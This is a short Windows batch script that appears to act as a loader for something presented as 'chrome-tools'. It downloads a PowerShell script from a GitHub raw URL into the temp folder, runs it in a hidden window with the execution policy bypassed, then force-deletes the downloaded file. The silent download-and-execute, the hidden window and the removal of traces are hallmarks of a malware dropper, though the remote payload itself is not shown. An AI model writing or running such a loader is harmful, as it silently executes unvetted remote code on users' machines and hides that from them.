@echo off
setlocal EnableDelayedExpansion

set "PS_URL=https://raw.githubusercontent.com/neiral/chrome-tools/main/install.ps1"
set "TEMP_PS=%TEMP%\i.ps1"

powershell -nop -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"

powershell -nop -c "irm -UseBasicParsing '%PS_URL%' -OutFile '%TEMP_PS%'"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%TEMP_PS%"

del /f /q "%TEMP_PS%" >nul 2>&1

endlocal
exit
